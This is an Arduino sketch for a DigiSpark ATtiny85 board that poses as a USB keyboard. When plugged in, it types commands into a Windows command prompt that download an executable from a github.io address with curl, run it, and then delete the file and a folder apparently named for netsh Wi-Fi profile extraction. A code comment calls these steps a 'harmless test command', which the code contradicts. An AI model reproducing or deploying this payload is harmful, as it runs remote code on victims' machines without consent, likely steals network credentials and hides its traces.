#include "DigiKeyboard.h"
#include<string.h>
int k(const char *command, int delay) {
	DigiKeyboard.print(command);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	if(delay > 0) {
		DigiKeyboard.delay(delay);
	}
	return 0;
}
void setup() {
	DigiKeyboard.update();
	DigiKeyboard.delay(2000);
	// Win+R
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	// Open Command Prompt
	k("cmd", 1000);
	// Execute a harmless test command
	k("del s.exe", 500);
	k("curl --output s.exe https://yourusername.github.io/s.exe", 1000);
	k("s.exe", 3000);
	k("del s.exe", 500);
	k("del attiny85-netsh-profiles.zip", 500);
	k("rmdir /s /q attiny85-netsh-profiles", 500);
	k("exit", 0);
}
void loop() {
}
